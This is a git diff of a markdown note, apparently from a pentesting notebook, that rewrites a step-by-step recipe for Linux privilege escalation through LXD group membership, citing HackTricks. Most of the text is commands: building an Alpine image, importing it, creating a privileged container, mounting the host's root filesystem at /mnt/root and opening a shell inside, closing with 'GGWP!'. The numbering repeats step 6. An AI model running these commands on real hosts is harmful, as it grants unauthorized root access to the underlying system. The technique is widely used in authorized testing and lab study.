@@ -1,27 +1,47 @@
+# LXC-LXD Group
+
 ## Source: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
 
 ## Steps:
 
-### Attacker: git clone https://github.com/alpinelinux/docker-alpine
+### 1) Attacker: Download Alpine Image
 
-### sudo ./build-alpine -a i686
+    git clone https://github.com/alpinelinux/docker-alpine
+
+### 2) Attacker: Build Image
+
+    sudo ./build-alpine -a i686
 
 ### Transfer to machine for rest of privesc
 
-#### First execute lxc init
+#### 1) 
 
-#### 1) lxc image list
+    lxc init
 
-#### 2) Upload image to target
+#### 2) 
 
-#### 3) lxc image import <image.tar.gz> --alias myalpine
+    lxc image list
 
-#### 4) lxc init myalpine jimmy -c security.privileged=true
+#### 3) Upload image to target
 
-#### 5) lxc config device add jimmy mydevice disk source=/ path=/mnt/root recursive=true
+#### 4) 
 
-#### 6) lxc start jimmy
+    lxc image import <image.tar.gz> --alias myalpine
 
-#### 7) lxc exec jimmy /bin/sh
+#### 5) 
+
+    lxc init myalpine jimmy -c security.privileged=true
+
+#### 6) 
+
+    lxc config device add jimmy mydevice disk source=/ path=/mnt/root recursive=true
+
+#### 6) 
+
+    lxc start jimmy
+
+#### 7) 
+
+    lxc exec jimmy /bin/sh
 
 #### 8) GGWP!
